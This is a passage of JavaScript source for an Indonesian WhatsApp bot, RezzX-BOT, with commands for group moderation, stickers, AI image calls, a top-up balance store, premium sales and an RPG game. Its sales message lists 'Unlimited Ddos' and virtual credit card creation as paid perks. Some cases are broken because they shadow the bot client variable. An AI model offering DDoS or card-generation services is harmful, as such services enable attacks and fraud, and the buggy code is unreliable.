  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isAdmins) return m.reply(mess.admin)
  if (!text && !m.quoted) m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.add 62xxxx*')
  let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await rezzx.groupParticipantsUpdate(m.chat, [users], 'add').catch(console.log)
  m.reply(`*SUKSES ADD @${text} KE GROUP*`)
}
break

case 'emi': {
  if (isBan) return m.reply(mess.ban)
  if (!text) m.reply ( `*PERMINTAAN ERROR!! CONTOH :*\n> *.emi anime boy*`)
  try {
    let e = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
    let cap = '*PROCESS SUCESS* ✅'
    rezzx.sendMessage(m.chat, { image: { url: e.result }, caption: cap }, { quoted: m })
  } catch(e) {
      m.reply ( "`*Command Not Responded*`")
    }
}
break

case 'kick': {
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isAdmins) return m.reply(mess.admin)
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await rezzx.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'promote': {
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isAdmins) return m.reply(mess.admin)
  if (!text && !m.quoted) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.promote 62xxxx*`)
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await rezzx.groupParticipantsUpdate(from, [users], 'promote')
  m.reply(`*SUKSES PROMOTE @${text} DI DALAM GROUP*`)
}
break

case 'demote': {
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isAdmins) return m.reply(mess.admin)
  if (!text && !m.quoted) m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.demote 62xxxx*')
  let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await rezzx.groupParticipantsUpdate(m.chat, [users], 'demote').catch(console.log)
  m.reply(`*SUKSES DEMOTE @${text} DI DALAM GROUP*`)
}
break

case 'degree': {
  if (isBan) return m.reply(mess.ban)
  if (!text) m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} halo siapa kamu?*`)
  try {
    wett()
    let dgr = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
    let np = 'DEGREE GURU AI'
    let pn = `session: false`
    let anp = 'https://telegra.ph/file/8eebfcef5ce0decd85d45.png'
    replyai(dgr.result, np, pn, anp)
    okk()
  } catch (err) {
      m.reply(mess.error)
    }
}
break

case 'ttp': case 'attp':
  if (isBan) return m.reply(mess.ban)
  if (args.length == 0) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.attp/ttp tobrut*`)
  wett()
  ini_txt = args.join(" ")
  ini_buffer = await getBuffer(`https://itzpire.com/maker/${command}?text=${text}`)
  rezzx.sendStickerImg(m.chat, ini_buffer, m, { packname: global.packname, author: global.author })
  okk()
break

case 'trigger':
if (isBan) return m.reply(mess.ban)
if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .trigger*`)
if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .trigger*`)
if (/image/.test(mime)) {
wett()
let mee2 = await rezzx.downloadAndSaveMediaMessage(quoted)
let mem2 = await TelegraPH(mee2)
let po2 = await getBuffer(`https://itzpire.com/maker/trigger?url=${mem2}`)
rezzx.sendStickerImg(m.chat, po2, m, { packname: global.packname, author: global.author })
okk()
}
break

case 'toimg': {
  if (isBan) return m.reply(mess.ban)
  if (!quoted) m.reply('*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Sticker Dengan Caption .toimg*')
  if (!/webp/.test(mime)) m.reply( '*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Sticker Dengan Caption .toimg*')
  wett()
  let media = await rezzx.downloadAndSaveMediaMessage(quoted)
  let ran = await getRandom('.png')
  exec(`ffmpeg -i ${media} ${ran}`, (err) => {
    fs.unlinkSync(media)
    if (err) m.reply( 'error')
    let buffer = fs.readFileSync(ran)
    rezzx.sendMessage(from, { image: buffer, caption: '*PROCESS SUCCESS* ✅'}, {quoted:m})
    okk()
    fs.unlinkSync(ran)
  })
}
break

case 'gc': case 'getcase':
  if (isBan) return m.reply(mess.ban)
  const getCase = (cases) => {
  return "case" + fs.readFileSync("./rezzx.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break" }
  try { 
    if (!isOwner) return m.reply(mess.owner)
    if (!q) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.gc namacase*`)
    let getc = await getCase(q)
    m.reply(getc) 
   } catch(err) { 
       console.log(err)
       m.reply(`*CASE ${q} TIDAK DITEMUKAN!!*`) 
     }
break

case 'shutdown':
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  rezzx.sendMessage(m.chat, {react: { text: '✅', key: m.key,}})
  m.reply(`*MEMATIKAN BOT....*`)
  await sleep(3000)
  process.exit()
break   

case 'twit': case 'twitter': 
  if (!text) return m.reply('masukkan url twitter');
  try {
    let tw = await (await fetch('https://api.shannmoderz.xyz/downloader/twitter?url=' + text)).json();
    let rezzx = tw.result.downloads[1];
    await rezzx.sendMessage(m.chat, { video: { url: rezzx.url }, caption: `*SUCCESS RESOLUSI ${rezzx.text} *` },{ quoted: m });
} catch (e) {
    return m.reply('rezzx api sedang error,' + e);
}
break

case 'ss': case 'ssweb':{
  if (isBan) return m.reply(mess.ban)
  if (!/^https?:\/\//.test(text)) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.ss https://xnxx.com*`)
  wett()
  let web = await (await fetch('https://api.shannmoderz.xyz/tools/sswebdesktop?url=' + text)).json();
  let rezzx = web.result
  rezzx.sendMessage(m.chat,{image: { url: rezzx }, caption: "*SUCCESS* ✅"},{quoted:m})
  okk()
}
break

case 'tourl': {
  if (isBan) return m.reply(mess.ban)
  if (!/video/.test(mime) && !/image/.test(mime)) m.reply( `*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Gambar Dengan Caption .tourl*`)
  if (!quoted) m.reply( `*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Gambar Dengan Caption .tourl*`)
  rezzx.sendMessage(m.chat, {react: { text: '🔄', key: m.key,}})
  let media = await rezzx.downloadAndSaveMediaMessage(quoted)
  if (/image/.test(mime)) {
    let anu = await TelegraPh(media)
    rezzx.sendMessage(m.chat, {react: { text: '✅', key: m.key,}})
    m.reply(util.format(anu))
  } else if (!/image/.test(mime)) {
      let anu = await UploadFileUgu(media)
      m.reply(util.format(anu))
    }
  await fs.unlinkSync(media)
}
break

case "setppbot": {
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Gambar Dengan Caption .setppbot*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Gambar Dengan Caption .setppbot*`)
  if (/webp/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Gambar Dengan Caption .setppbot*`)
  var medis = await rezzx.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
  if (args[0] == `/full`) {
    var { img } = await generateProfilePicture(medis)
    await rezzx.query({tag: 'iq',attrs: {to: botNumber,type:'set',xmlns: 'w:profile:picture'},content: [
      {tag: 'picture',attrs: { type: 'image' },content: img}
    ]
    })
    fs.unlinkSync(medis)
    m.reply(`*SUCCESS* ✅`)
  } else {
      var memeg = await rezzx.updateProfilePicture(botNumber, { url: medis })
      fs.unlinkSync(medis)
      m.reply(`*SUCCESS* ✅`)
    }
}
break

case 'hapusdb': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.hapusdb 62xxxx@s.whatsapp.net*');
  const userIdToDelete = text;
  const userIndex = db_user.findIndex(user => user.id === userIdToDelete);
  if (userIndex === -1) return m.reply('*User tidak ditemukan.*');
  db_user.splice(userIndex, 1);
  fs.writeFileSync('./setup/database/user.json', JSON.stringify(db_user, null, 2));
  m.reply(`*User dengan ID @${userIdToDelete.split('@')[0]} telah dihapus dari database.*`);
}
break

case 'listdb': {
  if (isBan) return m.reply(mess.ban)
  if (db_user.length === 0) return m.reply('*Tidak ada pengguna yang terdaftar.*');
  let userList = '*「 DAFTAR PENGGUNA TERDAFTAR 」*\n\n';
  db_user.forEach((user, index) => {
    userList += `${index + 1}. ID: @${user.id.split('@')[0]}, Name: ${user.name}\n`;
  });
  rezzx.sendMessage(from, { text: userList }, { quoted: m });
}
break

case 'daftar':{
  if (isBan) return m.reply(mess.ban)
  if (cekUser("id", sender) !== null) return m.reply('*Kamu Sudah Terdaftar, Tidak Perlu Daftar Lagi...*')
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.daftar nama*')
  const userId = sender;
  const userName = text;
  const userSerial = makeid(10);
  const newUser = {
    id: userId,
    name: userName,
    seri: userSerial,
    premium: false
  };
  db_user.push(newUser);
  fs.writeFileSync('./setup/database/user.json', JSON.stringify(db_user, null, 2));
  xreply(`*「 DETAIL USER 」*
👤 ID : @${userId.split('@')[0]}
🃏 Name : ${userName}
📟 NomorSeri : ${userSerial}
📣 *Note :* _Sekarang Kamu Bisa Mengakses Menu RezzX-BOT_`, 'https://telegra.ph/file/9411f71f2fee7fb97ce43.png')
}
break
 
case "owner": {
  if (isBan) return m.reply(mess.ban)
  const own = await rezzx.sendMessage(from, { 
  contacts: { 
    displayName: `${list.length} Kontak`, 
    contacts: list }, contextInfo: {
      forwardingScore: 9999999, 
      isForwarded: true,
      mentionedJid: [sender]
  }}, { quoted: m })
  rezzx.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, This Is My Owner 👑 `, contextInfo:{
    forwardingScore: 9999999, 
    isForwarded: true,
    mentionedJid:[sender]
  }}, { quoted: own })
}
break

case 'sewa': case 'buyprem': case 'sc': case 'script': case 'credit': {
m.reply(mess.wait)
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
         contextInfo: {
        	mentionedJid: [m.sender], 
        	isForwarded: true, 
	        forwardedNewsletterMessageInfo: {
			newsletterJid: '_',
			newsletterName: waktu, 
			serverMessageId: -1
			},
		},
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: `Hai *@${m.sender.split('@')[0]}*\nBerikut Daftar Price RezzX-BOT`
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: '© RezzX-V12'
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: false
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: '> *7 Days : 5000*\n> *30 Days : 15000*\n> *Permanen Days : 35000*\n\n🎲 *Benefit*\n\n> *Akses All Menu*\n> *Unlimited Ddos*\n> *Unlimited Create *VCC*\n> *Dll*\n'
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              text: '© RezzX-V12'
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '🎁 *Premium RezzX-BOT*\n',
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/78b232e8a33a531005ca4.jpg' } }, { upload: rezzx.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "cta_url",
                    buttonParamsJson: `{"display_text":"Buy","url":"${global.rezzurl}","merchant_url":"${global.rezzurl}"}`
                  }
                  ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: '> *3 Days : 5000*\n> *7 Days : 10.000*\n> *30 Days : 30.000*\n\n🎲 *Benefit*\n\n> *Akses Owner (sec)*\n> *Kick Member*\n> *Group Open/Close*\n> *Dll*\n'
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              text: '© RezzX-V12'
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '🎁 *Sewa RezzX-BOT*\n',
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/78b232e8a33a531005ca4.jpg' } }, { upload: rezzx.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "cta_url",
                    buttonParamsJson: `{"display_text":"Buy","url":"${global.rezzurl}","merchant_url":"${global.rezzurl}"}`
                  }
                  ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: '> *40.000 : No Encrypt*\n> *Free Update 3x*\n> *Free Apikey*\n\n🎲 *Benefit*\n\n> *Sc Full Button*\n> *Bisa Dijual Ulang*\n> *Bisa di rename*\n> *Intinya Serah lo*\n'
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              text: '© RezzX-V12'
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '🎁 *Buy Sc RezzX*\n',
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg' } }, { upload: rezzx.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "cta_url",
                    buttonParamsJson: `{"display_text":"Buy","url":"${global.rezzurl}","merchant_url":"${global.rezzurl}"}`
                  }
                  ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: 'RezzX-V12 New Fitur Keren'
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              text: '© RezzX-V12'
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: 'RezzXV12',
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/78b232e8a33a531005ca4.jpg' } }, { upload: rezzx.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "cta_url",
                    buttonParamsJson: `{"display_text":"Website","url":"${global.rezzurl2}","merchant_url":"${global.rezzurl2}"}`
                  }
                  ]
              })
            }
          ]
        })
      })
    }
  }
}, { userJid: m.chat, quoted: shan })
rezzx.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
}
break

case "addowner":
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!args[0]) return m.reply(`**PERMINTAAN ERROR!! CONTOH :*\n> *.addowner 62xxxx*`)
  bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknye = await rezzx.onWhatsApp(bnnd + `@s.whatsapp.net`)
  if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  ownerNumber.push(bnnd)
  fs.writeFileSync('./setup/database/owner.json', JSON.stringify(ownerNumber))
  m.reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!args[0]) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.delowner 62xxxx*`)
  ya = q.split("|")[0].replace(/[^0-9]/g, '')
  unp = ownerNumber.indexOf(ya)
  ownerNumber.splice(unp, 1)
  fs.writeFileSync('./setup/database/owner.json', JSON.stringify(ownerNumber))
  m.reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'public': {
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner) 
  rezzx.public = true
  m.reply('PUBLIC MODE ACTIVATED ✅')
}
break

case 'self': {
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner) 
  rezzx.public = false
  m.reply('SELF MODE ACTIVATED ✅')
}
break

case 'tfsaldo': {
    if (isBan) return m.reply(mess.ban)
    const args = q.split("|");
    if (args.length < 2) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.tfsaldo 62xxxx|nominal*`);
    
    const fromUserId = sender;
    const toUserId = args[0] + "@s.whatsapp.net";
    const amount = Number(args[1]);

    const result = transferSaldo(fromUserId, toUserId, amount, db_saldo);
    m.reply(result);
    break;
}

case 'minsaldo': {
    if (isBan) return m.reply(mess.ban)
    if (!isOwner) return m.reply(mess.owner);
    if (!q.split("|")[0]) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.minsaldo 62xxxx|nominal*`);
    minSaldo(q.split("|")[0] + "@s.whatsapp.net", Number(q.split(",")[1]), db_saldo);
    m.reply(`*SUCCESS MENGURANGI SALDO USER*`)
    break;
}

case 'addsaldo':{
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!q.split(",")[0]) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.addsaldo 62xxxx,nominal*`)
  addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
  m.reply(`*「 SALDO USER 」*

👤 ID: @${sender.split("@")[0]}
📱 Nomer: @${q.split(",")[0]}
📆 Tanggal: ${tanggal}
💳 Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, 
*LANGKAH SELANJUTNYA :* _.konfirm_`)
}
break

//PaketKalkulator
case 'kalkulator': {
  if (isBan) return m.reply(mess.ban)
  m.reply('*OPTIONS KALKULATOR :*\n➕ TAMBAH\n✖️ KALI\n➖ KURANG\n➗ BAGI')
}
break

case 'tambah':{
  if (isBan) return m.reply(mess.ban)
  if (!q) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.tambah angka1 angka2*`)
  var num_one = q.split(' ')[0]
  var num_two = q.split(' ')[1]
  if (!num_one) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.tambah angka1 angka2*`)
  if (!num_two) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.tambah angka1 angka2*`)
  var nilai_one = Number(num_one)
  var nilai_two = Number(num_two)
  m.reply(`${nilai_one + nilai_two}`)
}
break

case 'kurang':{
  if (isBan) return m.reply(mess.ban)
  if (!q) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.kurang angka1 angka2*`)
  var num_one = q.split(' ')[0]
  var num_two = q.split(' ')[1]
  if (!num_one) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.kurang angka1 angka2*`)
  if (!num_two) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.kurang angka1 angka2*`)
  var nilai_one = Number(num_one)
  var nilai_two = Number(num_two)
  m.reply(`yaitu ${nilai_one - nilai_two}`)
}
break

case 'kali':{
  if (isBan) return m.reply(mess.ban)
  if (!q) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.kali angka1 angka2*`)
  var num_one = q.split(' ')[0]
  var num_two = q.split(' ')[1]
  if (!num_one) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.kali angka1 angka2*`)
  if (!num_two) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.kali angka1 angka2*`)
  var nilai_one = Number(num_one)
  var nilai_two = Number(num_two)
  m.reply(`yaitu ${nilai_one * nilai_two}`)
}
break

case 'bagi':{
  if (isBan) return m.reply(mess.ban)
  if (!q) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.bagi angka1 angka2*`)
  var num_one = q.split(' ')[0]
  var num_two = q.split(' ')[1]
  if (!num_one) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.bagi angka1 angka2*`)
  if (!num_two) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.bagi angka1 angka2*`)
  var nilai_one = Number(num_one)
  var nilai_two = Number(num_two)
  m.reply(`yaitu ${nilai_one / nilai_two}`)
}
break
//EndPaket

//PaketStore
case 'konfirm': {
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!args[0]) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.konfirm|62xxxx*`)
  bnnd = text.split("|")[0]+'@s.whatsapp.net'
  rezzx.sendText(bnnd, `*TOPUP BERHASIL DI KONFIRMASI!!*\n*UNTUK MENGECEK SALDO KETIK* _.ceksaldo_`, m,)
}
break

case 'ceksaldo':{
   if (isBan) return m.reply(mess.ban)
   m.reply(`*「 DETAIL SALDO 」*

👤 *Name:* ${pushname}
📱 *Nomer:* ${sender.split('@')[0]}
💳 *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}

*Note :*
_SALDO HANYA BISA DIGUNAKAN UNTUK BERTRANSAKSI DIDALAM RezzX-BOT, TIDAK BISA DITARIK TUNAI ATAU TRANSFER_`)
}
break         

case "topup":
  if (isBan) return m.reply(mess.ban)
  depo = `*UNTUK TOPUP VIA SCAN QRIS YA GANN, MINIMAL TOPUP Rp.1000*,\n*EXAMPLE USAGE :* _.topuppin <nomonal>_`
  rezzx.sendMessage(from, {text : depo}, {quoted : shan}) 
break

case 'topuppin': 
  if (isBan) return m.reply(mess.ban)
  rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4a7086b5547d063811b3e.jpg' }, caption: `*JANGAN LUPA SS BUKTI DAN NOMINALNYA YA*\n*EXAMPLE KIRIM BUKTI :* _kirim gambar dengan caption .bukti_` }, { quoted: shan })
break        
        
case 'bukti':{
  if (isBan) return m.reply(mess.ban)
  let jumlah = args[0]
  if (!jumlah) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.bukti nominal*')
  m.reply('*TOPUP SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI TOPUP TERSEBUT*')
  rezzx.sendMessage(`${owner}@s.whatsapp.net`, { text: `*BUYYER TOPUP!!*\n*SEJUMLAH :* ${jumlah}\n*DARI :* @${sender.split('@')[0]}\n*LANGKAH SELANJUTNYA :* _.addsaldo 62xxxx,<nominal>_`, mentions: [sender]}, { quoted: shan })
}
break        
//EndPaket

case 'listprem':
  if (isBan) return m.reply(mess.ban)
  teksss = '*LIST USER PREMIUM*\n\n'
  for (let i of prem) {
    teksss += `• ${i}\n`
  }
  teksss += `*TOTAL :* _${prem.length}_`
  rezzx.sendMessage(from, { text: teksss.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": prem } })
break

case "addprem":{
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!args[0]) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.addprem 62xxxx*`)
  prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
  let ceknya = await rezzx.onWhatsApp(prrkek)
  if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  prem.push(prrkek)
  fs.writeFileSync("./setup/database/premium.json", JSON.stringify(prem))
  m.reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!args[0]) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.delprem 62xxxx*`)
  ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
  unp = prem.indexOf(ya)
  prem.splice(unp, 1)
  fs.writeFileSync("./setup/database/premium.json", JSON.stringify(prem))
  m.reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case'pay': {
    if (isBan) return m.reply(mess.ban)
    if (m.isGroup) return m.reply(mess.priv);
    
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "review_and_pay",
                                buttonParamsJson: JSON.stringify({
                                    currency: "IDR",
                                    total_amount: { value: 100000, offset: 100 },
                                    reference_id: "FOR YOU!!",
                                    type: "physical-goods",
                                    order: {
                                        status: "payment_requested",
                                        subtotal: { value: 200, offset: 100 },
                                        order_type: "RezzX-BOT",
                                        items: [
                                            {
                                                retailer_id: "custom-item-b5152f80-2dba-4bc5-aa63-35bbf30376c6",
                                                name: `SAPI IMPORT DARI THAILAND`,
                                                amount: { value: 20000, offset: 100 },
                                                quantity: 1
                                            },
                                            {
                                                retailer_id: "custom-item-rezzx-b5152f80-2dba-4bc5-aa63-35bbf30376c6",
                                                name: `SAPI IMPORT DARI PRINDAPAN`,
                                                amount: { value: 10000, offset: 100 },
                                                quantity: 1
                                            }
                                        ]
                                    },
                                    additional_note: "*FITUR PERCOBAAN YGY*",
                                    native_payment_methods: []
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.chat, quoted: m });
    rezzx.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break

case 'joinrpg':{
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (isPetualang) return m.reply('Kamu Sudah Terdaftar Sebelumnya')
  reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
  _petualang.push(m.sender)
  addInventoriDarah(m.sender, DarahAwal)
  addInventori(m.sender)
  addInventoriBuruan(m.sender)
  fs.writeFileSync('./games/rpg/inventory.json', JSON.stringify(_petualang))
  addLevelingId(m.sender) 
  let itu = 'https://telegra.ph/file/d9611e94ad04d0e65eaa3.png'
  rezzx.sendMessage(m.chat, {image:{url: itu}, caption: '*SUCCESS DAFTAR RPG*' }, {quoted:m})
}
break

case 'inv': case 'inventori': case 'inventory': {
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  let teksehmazeh = `*INFO USER*\n\n`
  teksehmazeh += `*❤️ Blood* : ${getDarah(m.sender) ? getDarah(m.sender) : 0}\n`
  teksehmazeh += `*◻️️ Iron* : ${getBesi(m.sender) ? getBesi(m.sender) : 0}\n`
  teksehmazeh += `*🌟 Gold* : ${getEmas(m.sender) ? getEmas(m.sender) : 0}\n`
  teksehmazeh += `*🐲 Emerald* : ${getEmerald(m.sender) ? getEmerald(m.sender) : 0}\n`
  teksehmazeh += `*💎 Diamond* : ${getDm(m.sender) ? getDm(m.sender) : 0}\n`
  teksehmazeh += `*💰 Money* : $${getBalance(m.sender, balance) ? getBalance(m.sender, balance) : 0}\n`
  teksehmazeh += `*🧪 Potion* : ${getPotion(m.sender) ? getPotion(m.sender) : 0}\n\n`
  teksehmazeh += `*YOUR INVENTORY*\n`
  teksehmazeh += `*🐟 Fish* :` + util.format(getIkan(m.sender) ? getIkan(m.sender) : 0 + getMancingIkan(m.sender) ? getMancingIkan(m.sender) :0) + `\n`
  teksehmazeh += `*🐔 Chicken* : ${getAyam(m.sender) ? getAyam(m.sender) : 0}\n`
  teksehmazeh += `*🐇 Rabbit* : ${getKelinci(m.sender) ? getKelinci(m.sender) : 0}\n`
  teksehmazeh += `*🐑 Sheep* : ${getDomba(m.sender) ? getDomba(m.sender) : 0}\n`
  teksehmazeh += `*🐄 Cow* : ${getSapi(m.sender) ? getSapi(m.sender) : 0}\n`
  teksehmazeh += `*🐘 Elephant* : ${getGajah(m.sender) ? getGajah(m.sender) : 0}\n`
  teksehmazeh += `🎢 *Coal* : ${getMiningcoal(m.sender) ? getMiningcoal(m.sender) : 0}\n`
  teksehmazeh += `🛑 *Stone* : ${getMiningstone(m.sender) ? getMiningstone(m.sender) : 0}\n`
  teksehmazeh += `❄️ *Copper Ore* : ${getMiningore(m.sender) ? getMiningore(m.sender) : 0}\n`
  teksehmazeh += `🛠️ *Ingot Ore* : ${getMiningingot(m.sender) ? getMiningingot(m.sender) : 0}\n`
  teksehmazeh += `🪵 *Wood* : ${getNebangKayu(m.sender) ? getNebangKayu(m.sender) : 0}\n`
  await rezzx.sendMessage(m.chat, { text: teksehmazeh, contextInfo: { externalAdReply: { title: 'RezzX-BOT', body: global.versisc, thumbnailUrl: `https://telegra.ph/file/0dc838d18642ec84bd9a4.png`, sourceUrl: `https://stechno.rf.gd`, mediaType: 1, renderLargerThumbnail: true }}}, { quoted: shan})
}
break

case 'mining': case 'mine':{
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (isCekDarah < 1) return m.reply(`_Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan (heal)_`) 
  let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
  let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
  let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
  var besinya = besi[Math.floor(Math.random() * besi.length)]
